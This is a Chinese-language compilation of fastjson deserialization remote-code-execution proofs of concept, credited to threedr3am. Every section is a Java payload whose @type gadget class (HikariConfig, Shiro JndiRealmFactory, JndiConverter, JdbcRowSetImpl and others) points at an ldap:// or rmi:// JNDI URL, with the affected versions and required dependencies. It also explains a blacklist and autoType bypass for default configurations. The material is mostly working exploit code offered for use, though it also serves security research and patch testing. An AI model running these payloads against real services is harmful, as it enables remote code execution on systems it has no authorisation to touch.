# fastjson 安全漏洞

编辑：r4v3zn

漏洞作者：threedr3am

Fastjson 是一个Java 语言编写的高性能功能完善的 JSON 库。 它采用一种“假定有序快速匹配”的算法，把 JSON Parse 的性能提升到极致，是目前 Java 语言中最快的 JSON 库。 Fastjson 接口简单易用，已经被广泛使用在缓存序列化、协议交互、Web 输出、Android 客户端等多种应用场景。

## HadoopHikari RCE（<= 1.2.68）

fastjson <= 1.2.68 RCE，需要开启 AutoType (report by threedr3am to ASRC)

### Payload

```java
  public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

    String payload = "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:43658/Calc\"}";
    String payload2 = "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"}";
    JSON.parse(payload);
  }
```

### 影响版本

- fastjson <= 1.2.68

### 依赖

```java
<dependency>
    <groupId>org.apache.hadoop</groupId>
    <artifactId>hadoop-client-minicluster</artifactId>
    <version>3.2.1</version>
</dependency>
```

### 来源

- https://github.com/threedr3am/learnjavabug/blob/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce/HadoopHikariPoc.java

## Shiro RCE（<= 1.2.66）（高频率）

fastjson <= 1.2.66 RCE，需要开启 AutoType

shiro-core gadget

### Payload

```java
public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    String payload = "{\"@type\":\"org.apache.shiro.realm.jndi.JndiRealmFactory\", \"jndiNames\":[\"ldap://localhost:43658/Calc\"], \"Realms\":[\"\"]}";//ldap方式
    JSON.parse(payload);
}
```

### 影响版本

- fastjson <= 1.2.66

### 依赖

```
<dependency>
    <groupId>org.apache.shiro</groupId>
    <artifactId>shiro-core</artifactId>
</dependency>
```

### 来源

- https://github.com/threedr3am/learnjavabug/blob/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce/ShiroPoc.java

## JndiConverter RCE（<= 1.2.62）

fastjson <= 1.2.62 RCE，需要开启AutoType (report by threedr3am to ASRC)

Jackson-databind 的 CVE-2020-8840 gadget 与 Fastjson 通用

### Payload

```java
public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    String payload = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://localhost:43658/Calc\"}";//ldap方式
    JSON.parse(payload);
}
```

### 影响版本

- fastjson <= 1.2.62

### 依赖

XBean-reflect 依赖的 gadget

```
<dependency>
    <groupId>org.apache.xbean</groupId>
    <artifactId>xbean-reflect</artifactId>
</dependency>
```

### 来源

- https://github.com/threedr3am/learnjavabug/blob/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce/JndiConverterPoc.java

## IbatisSqlmap RCE（<= 1.2.62）

fastjson <= 1.2.62 RCE，需要开启AutoType (report by threedr3am to 阿里云先知众测 - 内部已知)

### Payload

```java
public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);

    String payload = "{\"@type\":\"com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\",\"properties\": {\"@type\":\"java.util.Properties\",\"UserTransaction\":\"ldap://localhost:43658/Calc\"}}";//ldap方式
    JSON.parse(payload);
}
```

### 影响版本

- fastjson <= 1.2.62

### 依赖

```java
<dependency>
    <groupId>org.apache.ibatis</groupId>
    <artifactId>ibatis-sqlmap</artifactId>
    <version>2.3.4.726</version>
</dependency>
<dependency>
    <groupId>javax</groupId>
    <artifactId>javaee-api</artifactId>
    <version>8.0.1</version>
</dependency>
```

### 来源

- https://github.com/threedr3am/learnjavabug/blob/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce/IbatisSqlmapPoc.java

## CocoonSlide RCE（<= 1.2.62）

fastjson <= 1.2.62 RCE，需要开启AutoType (report by threedr3am to ASRC)

PS：因为引用了javax/jms/JMSException类，所以必须在javaee环境下

### Payload

```java
public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    String fastjsonPayload = "{\"@type\":\"org.apache.cocoon.components.slide.impl.JMSContentInterceptor\", \"parameters\": {\"@type\":\"java.util.Hashtable\",\"java.naming.factory.initial\":\"com.sun.jndi.rmi.registry.RegistryContextFactory\",\"topic-factory\":\"ldap://127.0.0.1:43658/Calc\"}, \"namespace\":\"\"}";
    JSON.parse(fastjsonPayload);
}
```

### 影响版本

- fastjson <= 1.2.62

### 依赖

```
<dependency>
    <groupId>slide</groupId>
    <artifactId>slide-kernel</artifactId>
    <version>2.1</version>
</dependency>
<dependency>
    <groupId>cocoon</groupId>
    <artifactId>cocoon-slide</artifactId>
    <version>2.1.11</version>
</dependency>
```

### 来源

- https://github.com/threedr3am/learnjavabug/blob/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce/CocoonSlidePoc.java

## Anteros RCE（<=1.2.62）

fastjson <= 1.2.62 RCE，需要开启 AutoType (report by threedr3am to 阿里云先知众测 - 内部已知)

### Payload

```java
public static void main(String[] args) {
    ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
    String payload = "{\"@type\":\"br.com.anteros.dbcp.AnterosDBCPConfig\",\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"}";//ldap方式
    JSON.parse(payload);
}
```

### 影响版本

- fastjson <= 1.2.62

### 依赖

```
<dependency>
    <groupId>com.codahale.metrics</groupId>
    <artifactId>metrics-healthchecks</artifactId>
    <version>3.0.2</version>
</dependency>
<dependency>
    <groupId>br.com.anteros</groupId>
    <artifactId>Anteros-Core</artifactId>
    <version>1.2.1</version>
</dependency>
<dependency>
    <groupId>br.com.anteros</groupId>
    <artifactId>Anteros-DBCP</artifactId>
    <version>1.0.1</version>
</dependency>
```

### 来源

- https://github.com/threedr3am/learnjavabug/blob/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce/AnterosPoc.java

## CommonsProxy RCE（<=1.2.61）

CommonsProxy fastjson <= 1.2.61 RCE，需要开启AutoType

### Payload

```java
public static void main(String[] args) {
    //TODO 使用rmi server模式时，jdk版本高的需要开启URLCodebase trust
//    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
    ParserConfig.global.setAutoTypeSupport(true);
//    String payload = "{\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"rmi://localhost:43657/Calc\"}";
    String payload = "{\"@type\":\"org.apache.commons.proxy.provider.remoting.SessionBeanProvider\",\"jndiName\":\"ldap://localhost:43658/Calc\",\"Object\":\"a\"}";
    try {
      JSON.parseObject(payload);
    } catch (Exception e) {
      e.printStackTrace();
    }
    JSON.parseObject(payload);
}
```

### 影响版本

- fastjson <= 1.2.61

### 依赖

```java
<dependency>
    <groupId>org.apache.commons</groupId>
    <artifactId>commons-proxy</artifactId>
</dependency>
```

### 来源

- https://github.com/threedr3am/learnjavabug/blob/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce/CommonsProxyPoc.java

## HikariConfig RCE（<=1.2.59）

fastjson <= 1.2.59 RCE，需要开启 AutoType

### Payload

```java
public static void main(String[] args) {
    //TODO 使用rmi server模式时，jdk版本高的需要开启URLCodebase trust
//    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");
    ParserConfig.global.setAutoTypeSupport(true);
//    String payload = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"rmi://localhost:43657/Calc\"}";
//    String payload = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"rmi://localhost:43657/Calc\"}";
    String payload = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:43658/Calc\"}";
    String payload2 = "{\"@type\":\"com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"}";
    JSON.parse(payload);
}
```

### 影响版本

- fastjson <= 1.2.59

### 依赖

```java
<dependency>
    <groupId>com.zaxxer</groupId>
    <artifactId>HikariCP</artifactId>
</dependency>
```

### 来源

- https://github.com/threedr3am/learnjavabug/blob/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce/HikariConfigPoc.java

## JdbcRowSetImpl RCE（<= 1.2.48）（常用）

fastjson 1.2.48 以下不需要任何配置，默认配置通杀 RCE

### Payload

```
  public static void main(String[] args) {
    //TODO 使用rmi server模式时，jdk版本高的需要开启URLCodebase trust
//    System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase","true");

    /*
    * TODO 该payload需要先通过java.lang.Class把com.sun.rowset.JdbcRowSetImpl加载进fastjson缓存，然后利用
    * TODO checkAutoType方法的缺陷（先通过缓存查询，有则立马返回，JdbcRowSetImpl否则检查黑名单hash）绕过黑名单和autoType的检查
    */
//    String payload = "[{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"rmi://localhost:43657/Calc\",\"autoCommit\":true}]";//rmi方式
    String payload = "[{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://localhost:43658/Calc\",\"autoCommit\":true}]";//ldap方式
    JSON.parse(payload);
    //所以，该payload需要分两步进行
  }
```



### 影响版本

- fastjson <= 1.2.48

### 依赖

无

### 来源

- https://github.com/threedr3am/learnjavabug/blob/master/fastjson/src/main/java/com/threedr3am/bug/fastjson/rce/NoNeedAutoTypePoc.java

